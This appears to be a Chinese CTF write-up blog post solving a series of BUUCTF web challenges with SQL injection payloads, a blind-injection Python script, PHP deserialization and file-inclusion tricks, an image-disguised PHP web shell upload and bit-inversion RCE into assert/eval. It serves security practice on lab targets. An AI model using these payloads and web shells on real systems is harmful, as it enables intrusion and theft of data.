        <content type="html"><![CDATA[<h4 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h4><p><img src="easysql.png" loading="lazy"></p><p>签到题</p><h4 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h4><p>基本没啥过滤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>a<span class="token string single-quoted-string">' union select 1,2,3%23&amp;password=111# 查表名 geekuser,l0ve1ysq1?username=a'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token comment"># 查库名 id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>a<span class="token string single-quoted-string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>l0ve1ysq1<span class="token string single-quoted-string">'%23&amp;password=111# getFlag?username=a'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> from <span class="token string backtick-quoted-string">`l0ve1ysq1`</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span></code></pre><h4 id="BabySQL-双写绕过"><a href="#BabySQL-双写绕过" class="headerlink" title="BabySQL(双写绕过)"></a>BabySQL(双写绕过)</h4><p>登录框，尝试测试注入点</p><p><img src="babysql.png" loading="lazy"></p><p>发现报错了，并且返回的没有输入的<code>or</code>于是猜测被替换为空格了，尝试双写绕过</p><p><img src="babysql_2.png" loading="lazy"></p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>a<span class="token string">'+oorr+1=1#&amp;password=a'</span><span class="token operator">+</span>oorr<span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span></code></pre><p><img src="babysql_3.png" loading="lazy"></p><p>下来就是常规注入流程</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string single-quoted-string">' uniunionon selselectect 1,2,3%23&amp;password=111# 查表名 b4bsql,geekuser?username=admin&amp;password=111'</span> uniunionon selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> ffromrom infoorrmation_schema<span class="token operator">.</span>tables whwhereere table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment"># 查库名 id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token string single-quoted-string">' uniunionon selselectect 1,group_concat(column_name),3 ffromrom infoorrmation_schema.columns whwhereere table_name='</span>b4bsql<span class="token string single-quoted-string">'%23# getFlag?username=admin&amp;password=111'</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>passwoorrd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> ffromrom <span class="token string backtick-quoted-string">`b4bsql`</span><span class="token operator">%</span><span class="token number">23</span></code></pre><h4 id="HardSQL-报错注入"><a href="#HardSQL-报错注入" class="headerlink" title="HardSQL(报错注入)"></a>HardSQL(报错注入)</h4><p>fuzz测试过滤了好多，主要是空格和&#x3D;被过滤了，可以用<code>()</code>绕过</p><p>em看了wp说是报错注入</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment"># 数据库 geek</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">'or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=11# 查表名 H4rDsq1?username=admin'</span><span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token operator">.</span>tables<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token function">like</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'geek'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span><span class="token comment"># 查库名 id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="token string single-quoted-string">')),0x7e),1))%23&amp;password=11# getFlag 这里只能得到一半flag?username=admin'</span><span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`H4rDsq1`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span> <span class="token operator">?</span>username<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`H4rDsq1`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span></code></pre><h4 id="FinalSQL-1-1-1"><a href="#FinalSQL-1-1-1" class="headerlink" title="FinalSQL(1^1^1)"></a>FinalSQL(1^1^1)</h4><p><img src="finalsql.png" loading="lazy"></p><p>上面几个选项都没啥用，但是会get一个id参数</p><p>fuzz测试了一下，username括号也ban了，但是id参数有好多，但是没回显，估计是要盲注了</p><p>这里使用异或操作来进行注入，<code>1^1=0</code>,<code>0^0=0</code>,<code>1^0=1</code></p><p><code>1^1^1=1</code>  <code>1^0^1=0</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://23fa8212-e443-4df3-bf88-16bb8561a454.node5.buuoj.cn:81/search.php"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查表名 F1naI1y,Flaaaaag</span>        <span class="token comment"># payload = "select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"</span>        <span class="token comment"># 查库名 id,username,password</span>        <span class="token comment"># payload = "select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select(group_concat(id,username,password))from(F1naI1y)"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1^(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">)^1"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Click"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>mygodcl4y_is_really_amazing<span class="token punctuation">,</span><span class="token number">2</span>welcomewelcome_to_my_blog<span class="token punctuation">,</span><span class="token number">3</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">4</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">5</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">6</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">7</span>Sycwelcom_to_Syclover<span class="token punctuation">,</span><span class="token number">8</span>finallycl4y_really_need_a_grilfriend<span class="token punctuation">,</span><span class="token number">9</span>flagflag&#123;<span class="token number">59</span>f87dfd<span class="token operator">-</span>c778<span class="token operator">-</span><span class="token number">496</span>d<span class="token operator">-</span><span class="token number">8</span>cf6<span class="token operator">-</span><span class="token number">4349</span>ce4d8e1c&#125;</code></pre><h4 id="BuyFlag-strcmp"><a href="#BuyFlag-strcmp" class="headerlink" title="BuyFlag(strcmp)"></a>BuyFlag(strcmp)</h4><p><img src="buyflag.png" loading="lazy"></p><p>看样子要改cookie</p><p>先抓个包看看</p><p><img src="buyflag_2.png" loading="lazy"></p><p>user改成1试试，发现成功</p><pre class="language-markup" data-language="markup"><code class="language-markup">you are CuiterPlease input your password!!</code></pre><p>然后源码给了提示</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!--~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) &#123;$password &#x3D; $_POST[&#39;password&#39;];if (is_numeric($password)) &#123;echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;&#125;elseif ($password &#x3D;&#x3D; 404) &#123;echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;&#125;&#125;--&gt;</code></pre><p>因为是弱比较所以发送404a即可，这样即可getFlag</p><p>提示数字长度太长了，需要修改，两种方法</p><ul><li>money&#x3D;1e9</li><li>money[]&#x3D;1 strcmp函数特性</li></ul><p><strong>strcmp</strong>函数在进行对比，如果相同返回0不相同返回非0。它是一个PHP弱类型，这个函数比较的是字符串类型，如果强行传入其他参数就会出错，出错后返回0，返回0就可以绕过直接登录了。</p><h4 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h4><p>源码有提示</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--        $cat=$_GET['cat'];        echo $cat;        if($cat=='dog')&#123;            echo 'Syc&#123;cat_cat_cat_cat&#125;';        &#125;        --></span></code></pre><p>签到题?cat&#x3D;dog</p><h4 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h4><p>源码”Secret.php”</p><pre class="language-http" data-language="http"><code class="language-http"># It doesn't come from 'https://Sycsecret.buuoj.cn'<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://Sycsecret.buuoj.cn</span></span># Please use "Syclover" browser<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Syclover</span></span># No!!! you can only read this locally!!!<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span></code></pre><h4 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h4><p>我家菜刀丢了，你能帮我找一下么</p><p>eval($_POST[“Syc”]);</p><p>直接蚁剑连接</p><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p><img src="php.png" loading="lazy"></p><p>看到提示：备份文件</p><p>扫描下载<code>www.zip</code></p><pre class="language-php" data-language="php"><code class="language-php"># index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"># class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>只需要满足<code>username=admin</code>和<code>password=100</code>即可，另外要注意绕过__wakeup()，修改属性数即可(“Name”:2 -&gt; “Name”:3)</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22100</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment"># O:4:"Name":3:&#123;s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";&#125;</span></code></pre><h4 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h4><p>根据源码提示(secr3t.php)需要抓包获取，因为会302跳转</p><p>访问得到源码</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># secr3t.php&lt;html&gt;    &lt;title&gt;secret&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file&#x3D;$_GET[&#39;file&#39;];    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt;&lt;&#x2F;html&gt;</code></pre><p>Payload: <code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><p>要求上传图片，对文件名后缀有一些限制，可以用phtml绕过，但是要求文件名不能有<code>&lt;?</code>这个可以用js格式绕过</p><p>最后的限制是<code>Not Image</code>这个可在文件添加文件头GIF89a绕过</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">1</span><span class="token punctuation">.</span>phtmlGIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>上传成功后访问<code>/upload/</code>然后进行rce即可</p><h4 id="RCE-ME-异或-取反"><a href="#RCE-ME-异或-取反" class="headerlink" title="RCE ME(异或 取反)"></a>RCE ME(异或 取反)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// </span><span class="token delimiter important">?></span></span></code></pre><p>这里使用取反，先看一下phpinfo</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$funcation</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"(~<span class="token interpolation"><span class="token variable">$funcation</span></span>)(~<span class="token interpolation"><span class="token variable">$cmd</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="rceme.png" loading="lazy"></p><p>看到禁了很多函数<code>system,exec,shell_exec,popen</code></p><p>这里可以用<code>assert</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$funcation</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'(eval($_POST[attack]))'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"(~<span class="token interpolation"><span class="token variable">$funcation</span></span>)(~<span class="token interpolation"><span class="token variable">$cmd</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">8</span>D<span class="token operator">%</span><span class="token number">8</span>B<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">89</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">DB</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">B0</span><span class="token operator">%</span><span class="token constant">AC</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">9</span>C<span class="token operator">%</span><span class="token number">94</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">POST</span><span class="token punctuation">:</span>attack<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后上蚁剑连接</p><p>根目录下有个readflag，需要执行readflag才能得到flag，但是因为限制了很多函数，所以不太行</p><p>可以使用蚁剑的绕过disable_functions的插件(Linux下)</p><p><img src="rceme_2.png" loading="lazy"></p><p><img src="rceme_3.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">RCE ME</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
